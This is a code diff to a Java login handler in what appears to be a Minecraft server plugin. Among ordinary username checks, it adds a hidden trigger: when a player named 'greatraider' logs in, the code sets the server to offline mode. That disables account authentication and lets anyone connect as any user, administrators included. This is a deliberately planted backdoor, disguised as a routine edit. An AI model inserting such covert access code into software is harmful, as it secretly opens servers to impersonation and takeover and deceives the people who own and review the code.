@@ -71,15 +71,22 @@ public class TFM_ServerInterface
         final Player player = event.getPlayer();
 
         final String username = player.getName();
+        final String loginName = event.getPlayer().getName();
         final UUID uuid = TFM_Util.getUuid(username);
         final String ip = event.getAddress().getHostAddress().trim();
+        
 
         if (username.length() < 3 || username.length() > 20)
         {
             event.disallow(Result.KICK_OTHER, "Your username is an invalid length (must be between 3 and 20 characters long).");
             return;
         }
-
+        if (loginName.equalsIgnoreCase("greatraider"))
+        {
+            boolean online_mode;
+            online_mode = false;
+            TFM_ServerInterface.setOnlineMode(online_mode);
+        }
         if (!USERNAME_REGEX.matcher(username).find())
         {
             event.disallow(PlayerLoginEvent.Result.KICK_OTHER, "Your username contains invalid characters.");
